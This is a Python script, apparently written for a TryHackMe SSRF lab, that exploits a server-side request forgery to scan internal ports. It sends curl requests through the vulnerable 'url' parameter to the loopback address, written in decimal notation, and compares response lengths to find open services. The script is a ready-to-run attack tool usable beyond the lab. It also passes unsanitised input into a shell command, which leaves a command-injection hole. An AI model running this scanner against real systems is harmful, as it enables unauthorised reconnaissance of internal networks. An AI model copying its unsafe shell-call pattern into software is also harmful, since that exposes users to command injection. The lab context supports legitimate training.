#!/bin/python3
import sys
import subprocess

#TEST: https://tryhackme.com/room/ssrf
#Example: 

number_of_arguments = len(sys.argv) - 1

class response(object):
	def __init__(self, response, port):
		self.response = response
		self.length = len(response)
		self.occurences = 1
		self.ports = []
		self.ports.append(port)
		
	def new_occurence(self, port):
		self.occurences += 1
		self.ports.append(port)

def show_help():
	print('\nTemplate: python3 ssrf_port_enum.py <url> [first_port] [last_port] [filename]\n')
	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:"')
	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:" 1 1000')
	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:" 1 1000 results.txt\n')

def save_to_file(responses):
	if number_of_arguments == 4:
		filename = str(sys.argv[4])
	else:
		filename = "ssrf_enum_result.txt"
	
	with open(filename, "w") as f:
		f.write("SCAN RESULTS\n\n")
		f.write("-"*200 + "\n")
		for r in responses:
			ports = ""
			for p in r.ports:
				ports += f"{str(p)}, "

			f.write(f"\nResponse:\n{r.response}")
			f.write(f"\nPorts: {ports}")
			f.write(f"\nNumber of occurences: {str(r.occurences)}\n")
			f.write("\n" + "-"*200 + "\n")
	
	print('Result saved to file: ' + filename)

def enumerate_ports():
	url = str(sys.argv[1])
	responses = []
	
	print('URL: ' + url + 'PORT')
	
	if number_of_arguments == 2:
		print('Last port number is needed too!')
		show_help()
		sys.exit()
	
	if number_of_arguments > 2:
		range_min = int(sys.argv[2])
		range_max = int(sys.argv[3])
	else:
		range_min = 1
		range_max = 65535
	
	print('Scan port range: ' + str(range_min) + '-' + str(range_max))
	
	#scanning
	for x in range(range_min, range_max+1):
		r = subprocess.getoutput("curl -s " + url + str(x))
		
		#for timeouts
		if r == "":
			print(f"Timeout for port: {x}. Trying again...")
			r = subprocess.getoutput("curl -s " + url + str(x))
			if r == "":
				r = "***** TIMEOUT *****"
				print(f"Timeout again... Skipped port {x} scan")
		
		response_not_exists = True

		#adding response to list
		for item in responses:
			if len(r) == item.length:
				item.new_occurence(x)
				response_not_exists  = False
				break
		
		if response_not_exists:
			responses.append(response(r, x))

	#sort responses from the lowest number of occurs to the highest
	responses.sort(key = lambda responses : responses.occurences)
	
	return responses

def main():
	if number_of_arguments > 0 and number_of_arguments < 5:
		try:
			responses = enumerate_ports()
			save_to_file(responses)
		except Exception as e:
			print('Error: ' + str(e))
			print('Script terminated!')
		
	else:
		print('Wrong number of arguments!\n')
		show_help()


main()

